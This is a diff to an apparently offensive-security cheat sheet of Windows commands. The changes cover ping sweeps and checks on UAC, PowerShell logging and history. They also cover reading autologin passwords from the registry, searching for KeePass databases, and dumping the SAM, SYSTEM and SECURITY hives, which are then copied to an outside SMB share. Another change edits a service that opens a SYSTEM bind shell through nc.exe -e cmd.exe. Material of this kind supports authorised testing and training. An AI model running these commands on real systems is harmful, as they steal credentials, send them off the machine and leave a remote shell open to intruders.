@@ -214,7 +214,9 @@ And here's a one-liner to do it in windows:
 
 ```bat
 :: note: meant to be copy-pasted, not in .bat script (%i vs %%i)
-for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.
+for /L %i in (1,1,255) do @ping -n 1 -w 2 10.2.2.%i | findstr "Reply"
+:: alternate (excludes valuable TTL info)
+for /L %i in (1,1,255) do @ping -n 1 -w 2 10.2.2.%i > nul && echo 10.2.2.%i is up.
 ```
 
 ## 3.4. Simple Port Scanner
@@ -1336,6 +1338,13 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 
+:: is UAC enabled? EnableLUA = 0x1 means enabled.
+:: ConsentPromptBehaviorAdmin = 0x5 is default, requires UAC bypass with MS-signed binary using autoelevate
+:: Bad = ConsentPrompt == 2 && SecureDesktopPrompt == 1 (UAC is set to 'Always Notify')
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v PromptOnSecureDesktop
+
 :: Check the powershell version
 powershell $PSVersionTable.PSVersion
 powershell (Get-Host).Version
@@ -1398,6 +1407,7 @@ powershell -c "get-process"
 wmic process get processid,caption,executablepath,commandline,description
 
 :: Installed Software
+dir /b/a:d "Program files" "program Files (x86)" | sort
 wmic product get name,version
 powershell -c "Get-WmiObject -Class Win32_Product | Select-Object -Property Name,Version"
 powershell -c "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize"
@@ -1405,6 +1415,7 @@ powershell -c "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\Cur
 :: check if PowerShell logging is enabled
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
 ## 5.2. Using Saved Windows Credentials
@@ -2456,8 +2467,9 @@ dir /b /s *.config *.conf *.cfg
 
 ### 7.3.2. Windows Passwords in Registry
 ```bat
-:: Windows autologin credentials
+:: Windows autologin credentials (32-bit and 64-bit versions)
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /reg:64 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
 
 :: VNC
 reg query "HKCU\Software\ORL\WinVNC3\Password"
@@ -2511,11 +2523,11 @@ reg query 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *
 ```bat
 :: Grab them from the registry
 reg save hklm\sam %TEMP%\sam.hiv /y
-reg hiv hklm\system %TEMP%\system.hiv /y
-reg hiv hklm\security %TEMP%\security.hiv /y
-copy %TEMP%\sam.hiv \\192.168.119.144\share\sam.hiv
-copy %TEMP%\system.hiv \\192.168.119.144\share\system.hiv
-copy %TEMP%\security.hiv \\192.168.119.144\share\security.hiv
+reg save hklm\system %TEMP%\system.hiv /y
+reg save hklm\security %TEMP%\security.hiv /y
+copy %TEMP%\sam.hiv \\192.168.119.144\share
+copy %TEMP%\system.hiv \\192.168.119.144\share
+copy %TEMP%\security.hiv \\192.168.119.144\share
 
 :: clean up stolen registry files
 del %TEMP%\*.hiv
@@ -2573,6 +2585,9 @@ dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\
 :: GPG keys
 dir /s /b /a C:\users\*.gpg
 :: usually under C:\Users\*\AppData\Roaming\gnupg\
+
+:: KeePass databases:
+dir *.kdb /a /b /s
 
 :: containing plaintext, encoded, or hashed credentials
 %SYSTEMDRIVE%\unattend.txt
@@ -2737,7 +2752,7 @@ Set-ADAccountPassword -Identity someuser -OldPassword (ConvertTo-SecureString -A
 
 ```bat
 :: Creates a SYSTEM bind-shell listening on port 54321
-sc create bdsvc binpath= "c:\windows\system32\cmd.exe /k c:\users\public\nc.exe -L -p 54321 -e c:\windows\system32\cmd.exe"
+sc create bdsvc binpath= "c:\windows\system32\cmd.exe /k c:\users\public\nc.exe -d -L -p 54321 -e c:\windows\system32\cmd.exe"
 sc create bdsvc binpath= "c:\windows\system32\cmd.exe /k c:\users\public\ncat.exe -lk -p 54321 -e c:\windows\system32\cmd.exe"
 :: Alternative: add \\computername after sc to do it remotely
 
@@ -3015,6 +3030,7 @@ nc –lnp LISTEN_PORT 0<bp | nc $VICTIM_IP VICTIM_PORT | tee bp
 ```
 
 # 11. Miscellaneous
+
 ## 11.1. Disable SSH Host Key Checking
 
 Put this at the top of your `~/.ssh/config` to disable it for all hosts:
